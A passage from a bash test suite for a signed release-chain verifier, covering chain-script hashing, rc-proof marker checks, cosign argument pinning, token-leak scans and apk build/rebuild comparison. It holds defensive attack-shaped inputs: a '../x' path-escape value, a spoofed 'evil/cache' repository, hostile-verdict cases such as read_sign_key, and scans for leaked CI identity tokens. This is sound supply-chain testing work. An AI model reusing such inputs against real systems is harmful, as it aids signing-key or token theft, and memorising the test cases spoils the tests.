! grep -E -q 'x-test\.sh|other\.sh' <<< "$cl" && ok "AC6 bytes: a test file named in a comment and an unnamed script stay outside the set" || bad "AC6 bytes: a test or unrelated file is in the set"
Scl=$(shaof "$CCL")
for f in bin/decide.py $AG/bin/sig.py $AG/bin/helper.py bin/deepmod.py bin/viab.sh $AG/bin/pkg/__init__.py $AG/bin/pkg/mod.py $AG/bin/pkg/sibling.py $AG/bin/pkg/sub/deep.py $AG/bin/other/thing.py; do
  rcg checkout -q -b "cl-$(basename "$f")" "$CCL"; printf '# changed\n' >> "$RG/$f"; rcg add -A > /dev/null; rcg commit -q -m cl; c=$(rcg rev-parse HEAD); rcg checkout -q main
  [ "$(shaof "$c")" != "$Scl" ] && [[ "$(shaof "$c")" =~ ^[0-9a-f]{64}$ ]] && ok "AC6 bytes: a changed $f changes the sha" || bad "AC6 bytes: a changed $f did not change the sha"
done
# the real tree: the scripts the real release workflow runs are in its set
cbx list --commit HEAD --repo "$root" || true; rl=$(cat "$work/cb.out")
for f in bin/patch-decide.py $AG/bin/auditor-signed-commit.py $AG/bin/auditorlib/__init__.py $AG/bin/auditorlib/signed_commit.py bin/chain-verify.py bin/chain-bytes-sha.py; do
  grep -F -q "  $f" <<< "$rl" && ok "AC6 bytes: the real chain set holds $f" || bad "AC6 bytes: the real chain set lacks $f"
done
rcg checkout -q -b gone "$C1"; printf '{"scripts":[{"path":"bin/chain-bytes-sha.py"},{"path":"bin/b.sh"},{"path":"bin/gone.sh"}]}\n' > "$RG/.github/policy/chain-scripts.json"
rcg add -A > /dev/null; rcg commit -q -m gone; CGONE=$(rcg rev-parse HEAD); rcg checkout -q main
rc=0; cbx sha --commit "$CGONE" --repo "$RG" || rc=$?
[ "$rc" = 1 ] && grep -F -q "refused at marker:" "$work/cb.err" && grep -F -q "bin/gone.sh" "$work/cb.err" && ok "AC6 bytes: a listed script that is not in the commit is refused naming it, never left out of the sha" || bad "AC6 bytes: a missing listed script gave exit $rc: $(head -c 150 "$work/cb.err")"
rcg checkout -q -b esc "$C1"; printf '{"scripts":[{"path":"../x"}]}\n' > "$RG/.github/policy/chain-scripts.json"; rcg add -A > /dev/null; rcg commit -q -m esc; CESC=$(rcg rev-parse HEAD); rcg checkout -q main
rc=0; cbx sha --commit "$CESC" --repo "$RG" || rc=$?
[ "$rc" = 1 ] && grep -F -q "refused at marker:" "$work/cb.err" && ok "AC6 bytes: a listed path that leaves bin/ is refused" || bad "AC6 bytes: an escaping path gave exit $rc"
rc=0; cbx sha --commit 0123456789abcdef0123456789abcdef01234567 --repo "$RG" || rc=$?
[ "$rc" = 1 ] && grep -F -q "refused at marker:" "$work/cb.err" && ok "AC6 bytes: a commit that does not exist is refused" || bad "AC6 bytes: an unknown commit gave exit $rc"
# the marker, written for the rc tag's bytes and the records of rc_ok; committed on top of the rc tag's commit
python3 "$work/mkmarker.py" "$work/marker-ok.json" v0.3.0-rc1 1 "$S1" "$work/rc_ok"
cp "$work/marker-ok.json" "$RG/.github/policy/rc-proof.json"; rcg add -A > /dev/null; rcg commit -q -m marker; C2=$(rcg rev-parse HEAD)
printf 'later\n' >> "$RG/README.md"; rcg add -A > /dev/null; rcg commit -q -m later; C3=$(rcg rev-parse HEAD)
MK="$RG/.github/policy/rc-proof.json"
cm() { cbx check-marker --marker "${2:-$MK}" --commit "$1" --repo "$RG"; }   # cm COMMIT [MARKER]
cm_ok() { local rc=0; cm "$2" "${3:-}" || rc=$?; [ "$rc" = 0 ] && ok "$1" || bad "$1 (exit $rc: $(head -c 200 "$work/cb.err"))"; }
cm_no() { local l=$1 w=$2 rc=0; shift 2; cm "$@" || rc=$?   # cm_no LABEL "word|word" COMMIT [MARKER]
  local first miss=0 x ws; first=$(head -n 1 "$work/cb.err"); IFS='|' read -r -a ws <<< "$w"
  for x in "${ws[@]}"; do grep -F -q -- "$x" <<< "${first#refused at marker: }" || miss=1; done
  if [ "$rc" = 1 ] && [ "$miss" = 0 ] && [[ "$first" == "refused at marker: "* ]] && ! grep -F -q Traceback "$work/cb.err"; then ok "$l"; else bad "$l (exit $rc, wanted 1 with '$w'; $first)"; fi; }
cm_ok "AC6 marker: a marker for the bytes of the commit it is committed in, and an rc tag that is its ancestor, validates" "$C2"
cm_ok "AC6 marker: it still validates at a later commit that changes no chain file (the README)" "$C3"
cother=$(mutc chg .github/workflows/stage-build.yml "# edited after the proof"); cm_no "AC6 marker: a marker for other bytes (a chain file changed after the proof) is refused, naming the bytes" "bytes" "$cother"
cm_no "AC6 marker: a missing marker file is refused, never skipped" "missing" "$C2" "$work/no-such-marker.json"
mkdir -p "$work/markerdir"; cm_no "AC6 marker: an unreadable marker (a directory) is refused" "unreadable" "$C2" "$work/markerdir"
: > "$work/marker-empty.json"; cm_no "AC6 marker: an empty marker is refused" "shape" "$C2" "$work/marker-empty.json"
printf '{not json' > "$work/marker-junk.json"; cm_no "AC6 marker: a marker that is not JSON is refused" "shape" "$C2" "$work/marker-junk.json"
python3 - "$work/marker-ok.json" "$work" <<'PY'
import json, sys
m = json.load(open(sys.argv[1])); w = sys.argv[2]
def save(n, d): json.dump(d, open("%s/marker-%s.json" % (w, n), "w"))
save("extra", dict(m, extra="x"))
d = dict(m); del d["run_id"]; save("norun", d)
save("final", dict(m, rc_tag="v0.3.0"))
save("rcdot", dict(m, rc_tag="v0.3.0-rc.1"))
save("badrun", dict(m, run_id="12ab"))
save("upper", dict(m, chain_sha256=m["chain_sha256"].upper()))
save("short", dict(m, chain_sha256=m["chain_sha256"][:60]))
r = dict(m["records"]); del r["sign"]; save("norecord", dict(m, records=r))
r = dict(m["records"]); del r["rekor"]; save("norekor", dict(m, records=r))      # ratify B: a marker without its rekor row
r = dict(m["records"]); r["extra"] = "0" * 64; save("extrarecord", dict(m, records=r))
r = dict(m["records"]); r["build"] = "XYZ"; save("badrecord", dict(m, records=r))
save("other", dict(m, chain_sha256="0" * 64))
open("%s/marker-dup.json" % w, "w").write(open(sys.argv[1]).read().replace('"rc_tag"', '"run_id": "1", "rc_tag"', 1))
PY
cm_no "AC6 marker: an unknown extra key is refused (the object is closed)" "shape" "$C2" "$work/marker-extra.json"
cm_no "AC6 marker: a missing key (run_id) is refused" "shape" "$C2" "$work/marker-norun.json"
cm_no "AC6 marker: a duplicate key is refused" "shape" "$C2" "$work/marker-dup.json"
cm_no "AC6 marker: a final tag as the rc tag is refused (rc_tag must be vX.Y.Z-rcN)" "rc_tag" "$C2" "$work/marker-final.json"
cm_no "AC6 marker: the dotted rc spelling is refused" "rc_tag" "$C2" "$work/marker-rcdot.json"
cm_no "AC6 marker: a run id that is not digits is refused" "run_id" "$C2" "$work/marker-badrun.json"
cm_no "AC6 marker: an upper-case chain sha is refused" "chain_sha256" "$C2" "$work/marker-upper.json"
cm_no "AC6 marker: a short chain sha is refused" "chain_sha256" "$C2" "$work/marker-short.json"
cm_no "AC6 marker: a record digest missing is refused" "shape" "$C2" "$work/marker-norecord.json"
cm_no "AC6 marker: a marker without its rekor record row is refused (ratify B: every signature keeps its Rekor entry)" "shape" "$C2" "$work/marker-norekor.json"
cm_no "AC6 marker: an extra record digest is refused" "shape" "$C2" "$work/marker-extrarecord.json"
cm_no "AC6 marker: a record digest that is not a sha256 is refused" "records" "$C2" "$work/marker-badrecord.json"
cm_no "AC6 marker: a sha for other bytes (all zero) is refused, naming the bytes" "bytes" "$C2" "$work/marker-other.json"
# an rc tag that is not an ancestor: v0.3.0-rc2 sits on a side branch from C1
rcg checkout -q -b side "$C1"; printf 'side\n' >> "$RG/README.md"; rcg add -A > /dev/null; rcg commit -q -m side; rcg tag v0.3.0-rc2; rcg checkout -q main
python3 - "$work/marker-ok.json" "$work" <<'PY'
import json, sys
m = json.load(open(sys.argv[1])); json.dump(dict(m, rc_tag="v0.3.0-rc2"), open("%s/marker-rc2.json" % sys.argv[2], "w"))
json.dump(dict(m, rc_tag="v0.3.0-rc9"), open("%s/marker-rc9.json" % sys.argv[2], "w"))
PY
cm_no "AC6 marker: an rc tag that is not an ancestor of the commit is refused" "ancestor" "$C2" "$work/marker-rc2.json"
cm_no "AC6 marker: an rc tag that does not exist in the repository is refused" "does not exist" "$C2" "$work/marker-rc9.json"
# an rc tag whose commit holds other chain files than the marker names: the proof is for bytes the rc run never ran
rcg checkout -q -b rc3 "$C1"; printf '# rc3\n' >> "$RG/.github/workflows/release.yml"; rcg add -A > /dev/null; rcg commit -q -m rc3; rcg tag v0.3.0-rc3
printf '# after\n' >> "$RG/bin/b.sh"; rcg add -A > /dev/null; rcg commit -q -m after; C_AFTER=$(rcg rev-parse HEAD); rcg checkout -q main
S_AFTER=$(shaof "$C_AFTER")
python3 - "$work/marker-ok.json" "$work" "$S_AFTER" <<'PY'
import json, sys
m = json.load(open(sys.argv[1])); json.dump(dict(m, rc_tag="v0.3.0-rc3", chain_sha256=sys.argv[3]), open("%s/marker-rc3.json" % sys.argv[2], "w"))
PY
cm_no "AC6 marker: the sha equals the commit's but the rc tag's commit holds other chain files: refused" "rc tag" "$C_AFTER" "$work/marker-rc3.json"
# ---- chain-verify.py rc-proof: the rc run's records, verified under the rc tag's identities, and the marker's digests
# ---- chain-verify.py rc-proof: the rc run's records, verified under the rc tag's identities, and the marker's digests
RCP() { echo rc-proof --marker "${3:-$MK}" --commit "${2:-$C2}" --repo "$RG" --records "$work/$1" --template "$work/template.json" \
          --now "$NOW" --repository "${RCREPO:-fosterstack/cache}"; }
expect_ok "AC6 rc-proof: the marker, the commit and a complete rc run (Build, Sign with its Rekor stub, Rebuild, the four Check records, the hostile verdict) are accepted" $(RCP rc_ok)
expect_ok "AC6 rc-proof: the same proof is accepted at a later commit with the same chain files" $(RCP rc_ok "$C3")
expect_refuse "AC6 rc-proof: a marker for other bytes is refused before any record is read" "marker|bytes" $(RCP rc_ok "$cother")
expect_refuse "AC6 rc-proof: a missing marker file is refused" "marker|missing" $(RCP rc_ok "$C2" "$work/no-such-marker.json")
expect_refuse "AC6 rc-proof: an rc tag that is not an ancestor of the commit is refused" "marker|ancestor" $(RCP rc_ok "$C2" "$work/marker-rc2.json")
expect_refuse "AC6 rc-proof: a final tag in the marker is refused" "marker|rc_tag" $(RCP rc_ok "$C2" "$work/marker-final.json")
expect_refuse "AC6 rc-proof: Sign's provenance whose built commit is not the rc tag's commit (a moved or recreated tag) is refused naming the commit" "marker|built|commit" $(RCP rc_othersrc)
expect_refuse "AC6 rc-proof: Sign's provenance that names no built commit is refused" "marker|built|commit" $(RCP rc_nosrc)
expect_refuse "AC6 rc-proof: Sign's provenance made for another tag is refused (the rc tag's identity)" "sign|v0.3.1" $(RCP rc_badsign)
expect_refuse "Q2a AC6 rc-proof: Build's record of the run for the FINAL tag (its signed admission baseline names v0.3.0) is refused under the rc tag's policy" "build|tag|v0.3.0" $(RCP rc_build_final)
expect_refuse "Q2a AC6 rc-proof: a Build record that holds no admission-baseline.json product is refused (nothing signed names the tag)" "build|admission-baseline.json" $(RCP rc_noadm)
expect_refuse "AC6 rc-proof: a missing Check record (arm64) is refused" "check|arm64|missing" $(RCP rc_check_missing)
expect_refuse "AC6 rc-proof: Rebuild's record about other digests is refused" "rebuild|digest" $(RCP rc_rebuild_other)
expect_refuse "AC6 rc-proof: a hostile verdict in which an attempt was accepted is refused" "mint_sign_cert" $(RCP rc_hostile_accepted)
expect_refuse "AC6 rc-proof: a hostile verdict with a missing case row stays an error, not a skip" "read_sign_key" $(RCP rc_hostile_missing)
expect_refuse "AC6 rc-proof: a hostile verdict whose bytes are not the ones the marker names is refused (digest)" "marker|digest|hostile_verdict" $(RCP rc_hostile_reworded)
expect_refuse "AC6 rc-proof: hostile rows whose exit code is 2 (not the verifier's refusal status 1) are refused" "hostile|exit" $(RCP rc_hostile_exit2)
expect_refuse "AC6 rc-proof: a null attempt row is a refusal naming the hostile verdict, not a traceback" "hostile|row" $(RCP rc_hostile_null)
expect_refuse "AC6 rc-proof: an exit code of true is not an integer exit status and is refused" "hostile|exit" $(RCP rc_hostile_boolexit)
expect_refuse "AC6 rc-proof: an exit code of 1.0 on a refused row is not an integer exit status and is refused" "hostile|exit" $(RCP rc_hostile_floatexit)
expect_refuse "AC6 rc-proof: the positive control's exit code 0.0 is not an integer exit status and is refused" "hostile|control" $(RCP rc_hostile_floatctl)
python3 - "$work/marker-ok.json" "$work" <<'PY'
import json, sys
m = json.load(open(sys.argv[1])); r = dict(m["records"]); r["sign"] = "f" * 64
json.dump(dict(m, records=r), open("%s/marker-signdigest.json" % sys.argv[2], "w"))
PY
expect_refuse "AC6 rc-proof: a record whose sha256 is not the marker's is refused naming the record" "marker|digest|sign" $(RCP rc_ok "$C2" "$work/marker-signdigest.json")
# Codex 4b-1 r1 (A B1, B B2): the marker's run id is bound to the records: Sign's provenance (verified under the rc tag's identity) names the run it ran in
python3 - "$work/marker-ok.json" "$work" <<'PY'
import json, sys
m = json.load(open(sys.argv[1])); json.dump(dict(m, run_id="2"), open("%s/marker-run2.json" % sys.argv[2], "w"))
json.dump(dict(m, run_id="11"), open("%s/marker-run11.json" % sys.argv[2], "w"))
PY
expect_refuse "AC6 rc-proof: a marker whose run id is not the run Sign's provenance names (2, the provenance names 1) is refused naming the run" "marker|run" $(RCP rc_ok "$C2" "$work/marker-run2.json")
expect_refuse "AC6 rc-proof: a run id that merely starts with the provenance's (11 against 1) is refused" "marker|run" $(RCP rc_ok "$C2" "$work/marker-run11.json")
RCREPO=evil/cache; rcargs=$(RCP rc_ok); RCREPO=
expect_refuse "AC6 rc-proof: a run of another repository (the provenance names fosterstack/cache) is refused" "marker|run|repository" $rcargs
rc=0; python3 "$cv" rc-proof --help > /dev/null 2>&1 || rc=$?
[ "$rc" = 0 ] && ok "AC6 rc-proof: the subcommand exists (usage)" || bad "AC6 rc-proof: no such subcommand (exit $rc)"
expect_refuse "AC6 rc-proof: a Check record signed by a key the manifest does not name is refused" "check|signature" $(RCP rc_check_otherkey)
# every call the fake cosign ever received is the pinned form, and there were exactly as many as successful signs plus the S1 cases (where
# cosign returned a bad bundle and Sign refused it); never one for a refusal of the check itself
n=$(grep -c . "$work/cosign-all.log" 2> /dev/null || true)
if [ "$n" = "$((SIGNS_OK + POSTSIGN))" ] && [ "$SIGNS_OK" -ge 1 ] && ! grep -E -v -q "$ARGV_RE" "$work/cosign-all.log"; then ok "001-AC2 cosign was called exactly once per successful sign ($SIGNS_OK) and per bad-bundle case ($POSTSIGN), always with the pinned argv"; else bad "001-AC2 cosign calls ($n) != successful signs ($SIGNS_OK) + bad-bundle cases ($POSTSIGN), or an unpinned argv was used"; fi
[ "$LEAKS" = 0 ] && ok "001-AC3 the token sentinels (ACTIONS_ID_TOKEN_REQUEST_TOKEN/URL, COSIGN_IDENTITY_TOKEN) appear in no stdout, stderr or cosign argv of any run" || bad "001-AC3 a token sentinel leaked into $LEAKS run(s)' output or the cosign argv"
if ! grep -r -F -q -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" "$work/sd" 2> /dev/null; then ok "001-AC3 the token sentinels appear in no file Sign wrote to any output folder"; else bad "001-AC3 a token sentinel was written into an output folder"; fi
# the sentinels also appear in no file written ANYWHERE the verifier could write: the whole work dir (policies, stubs, outputs), the
# current directory, and the temp dir, for files newer than the first run
leakfiles=$( { grep -r -l -F -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" "$work" 2> /dev/null || true
               find "$PWD" -maxdepth 3 -type f -newer "$MARK" -not -path '*/.git/*' -not -path "$work/*" -print0 2> /dev/null | xargs -0 grep -l -F -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" 2> /dev/null || true
               find "${TMPDIR:-/tmp}" -maxdepth 3 -type f -newer "$MARK" -not -path "$work/*" -print0 2> /dev/null | xargs -0 grep -l -F -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" 2> /dev/null || true; } | sort -u)
if [ -z "$leakfiles" ]; then ok "001-AC3 the token sentinels appear in no file written under the work dir, the current directory or the temp dir"; else bad "001-AC3 a token sentinel was written to: $(echo "$leakfiles" | head -3 | tr '\n' ' ')"; fi

# ---- apk-compare (the owner's rule of Oct 21 2026: the comparison of Build's and Rebuild's apks runs in a job without a key; Release reads only its small result file) ----
# bin/release-compare.sh writes apk-compare/apk-compare.json (verdict pass, four pairs with the sha256 and the apk-tool digest of both apks); `apk-compare` checks that file
# against Build's attested apk digests (witness-build/digests.json keys apk-<variant>-<amd64|arm64>) and accepts only pass, exactly four pairs, rebuild == build == attested
python3 - "$work" <<'PY'
import hashlib, json, sys
w = sys.argv[1]
def h(x): return "sha256:" + hashlib.sha256(x.encode()).hexdigest()
dig = {"image-production": h("ip"), "image-fips": h("if")}
pairs = []
for arch, runner in (("amd64", "x86_64"), ("arm64", "aarch64")):
    for variant, name in (("standard", "fscache-0.3.0-r0.apk"), ("fips", "fscache-fips-0.3.0-r0.apk")):
        d = h("data-%s-%s" % (variant, arch)); dig["apk-%s-%s" % (variant, arch)] = d
        pairs.append({"arch": arch, "variant": variant, "name": name, "build_sha256": hashlib.sha256(("b" + d).encode()).hexdigest(), "rebuild_sha256": hashlib.sha256(("r" + d).encode()).hexdigest(), "build_digest": d, "rebuild_digest": d})
json.dump(dig, open(w + "/acd.json", "w"))
good = {"verdict": "pass", "pairs": pairs}
def put(name, obj): json.dump(obj, open(w + "/ac_" + name + ".json", "w"))
def mod(f):
    o = json.loads(json.dumps(good)); f(o); return o
put("good", good)
put("fail", mod(lambda o: o.update(verdict="fail")))
put("noverdict", mod(lambda o: o.pop("verdict")))
put("Pass", mod(lambda o: o.update(verdict="Pass")))
put("three", mod(lambda o: o["pairs"].pop()))
put("five", mod(lambda o: o["pairs"].append(dict(o["pairs"][0], variant="fips", name="fscache-fips-0.3.0-r0.apk", arch="amd64"))))
put("dup", mod(lambda o: o["pairs"].__setitem__(3, dict(o["pairs"][2]))))
put("wrongdigest", mod(lambda o: o["pairs"][1].update(build_digest=h("other"), rebuild_digest=h("other"))))
put("rebuilddiffers", mod(lambda o: o["pairs"][2].update(rebuild_digest=h("other"))))
put("extrakey", mod(lambda o: o["pairs"][0].update(note="x")))
put("extratop", mod(lambda o: o.update(note="x")))
put("badhex", mod(lambda o: o["pairs"][0].update(build_sha256="z" * 64)))
put("upperhex", mod(lambda o: o["pairs"][0].update(rebuild_sha256="A" * 64)))
put("prefixed", mod(lambda o: o["pairs"][0].update(build_sha256="sha256:" + "a" * 64)))
put("shorthex", mod(lambda o: o["pairs"][0].update(build_sha256="a" * 63)))
put("badname", mod(lambda o: o["pairs"][0].update(name="fscache-evil.apk")))
put("badnamefips", mod(lambda o: o["pairs"][1].update(name="fscache-0.3.0-r0.apk")))
put("badarch", mod(lambda o: o["pairs"][0].update(arch="x86_64")))
put("badvariant", mod(lambda o: o["pairs"][0].update(variant="debug")))
put("pairsnotlist", mod(lambda o: o.update(pairs={"a": 1})))
open(w + "/ac_notjson.json", "w").write("{not json")
open(w + "/ac_array.json", "w").write("[]")
d2 = json.loads(json.dumps(dig)); d2.pop("apk-fips-arm64"); json.dump(d2, open(w + "/acd_missing.json", "w"))
PY
ACV() { echo apk-compare --file "$work/ac_$1.json" --digests "$work/${2:-acd}.json"; }
expect_ok     "apk-compare: the good result (pass, four pairs, rebuild == build == Build's attested digest) is accepted" $(ACV good)
for c in fail noverdict Pass; do expect_refuse "apk-compare: the verdict '$c' is refused (only the exact word pass)" "apk-compare|verdict" $(ACV $c); done
expect_refuse "apk-compare: three pairs are refused" "apk-compare|four" $(ACV three)
expect_refuse "apk-compare: five pairs are refused" "apk-compare|four" $(ACV five)
expect_refuse "apk-compare: a pair twice (and another missing) is refused" "apk-compare|pair" $(ACV dup)
expect_refuse "apk-compare: a Build digest that is not the one Build attested is refused" "apk-compare|attested" $(ACV wrongdigest)
expect_refuse "apk-compare: a Rebuild digest that differs from Build's is refused" "apk-compare|rebuild" $(ACV rebuilddiffers)
expect_refuse "apk-compare: an extra key in a pair is refused" "apk-compare|key" $(ACV extrakey)
expect_refuse "apk-compare: an extra top-level key is refused" "apk-compare|key" $(ACV extratop)
for c in badhex upperhex prefixed shorthex; do expect_refuse "apk-compare: a sha256 that is not 64 lowercase hex ($c) is refused" "apk-compare|sha256" $(ACV $c); done
expect_refuse "apk-compare: a standard apk named like nothing Build makes is refused" "apk-compare|name" $(ACV badname)
expect_refuse "apk-compare: a fips apk with the standard name is refused" "apk-compare|name" $(ACV badnamefips)
expect_refuse "apk-compare: an architecture other than amd64 and arm64 is refused" "apk-compare|arch" $(ACV badarch)
expect_refuse "apk-compare: a variant other than standard and fips is refused" "apk-compare|variant" $(ACV badvariant)
expect_refuse "apk-compare: pairs that are not a list are refused" "apk-compare|pairs" $(ACV pairsnotlist)
expect_refuse "apk-compare: a file that is not JSON is refused" "apk-compare|json" $(ACV notjson)
expect_refuse "apk-compare: a JSON array in place of the object is refused" "apk-compare|object" $(ACV array)
expect_refuse "apk-compare: a missing result file is refused" "apk-compare|missing" apk-compare --file "$work/ac_nothere.json" --digests "$work/acd.json"
expect_refuse "apk-compare: Build's attested list without an apk digest is refused" "apk-compare|attested" $(ACV good acd_missing)
EXPECT=669
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
